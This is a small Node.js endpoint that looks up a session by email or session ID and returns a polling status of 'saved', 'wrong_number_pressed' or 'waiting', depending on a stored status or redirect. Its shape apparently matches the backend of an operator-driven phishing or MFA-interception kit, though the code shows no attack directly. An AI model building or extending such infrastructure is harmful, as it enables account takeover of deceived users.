const { getSessionAsync, getSessionByEmail } = require('./_store');

module.exports = async (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

  let email = req.body?.em || req.query?.em || '';
  let sessionId = req.body?.sessionId || req.query?.sessionId || '';

  if (typeof req.body === 'string') {
    try {
      const parsed = JSON.parse(req.body);
      email = email || parsed.em || '';
      sessionId = sessionId || parsed.sessionId || '';
    } catch (e) {
      try {
        const params = new URLSearchParams(req.body);
        email = email || params.get('em') || '';
        sessionId = sessionId || params.get('sessionId') || '';
      } catch (e2) {}
    }
  }

  let session = null;
  if (sessionId) {
    session = await getSessionAsync(sessionId, true);
  }
  if (!session && email) {
    session = getSessionByEmail(email);
  }

  if (!session) return res.status(200).send('waiting');

  const status = session.status || 'pending';
  const redirect = session.redirect || '';
  if (status === 'saved' || status === 'approved' || redirect.includes('cvent') || redirect === 'saved') {
    return res.status(200).send('saved');
  } else if (status === 'wrong_number_pressed' || redirect === 'wrong_number') {
    return res.status(200).send('wrong_number_pressed');
  } else {
    return res.status(200).send('waiting');
  }
};
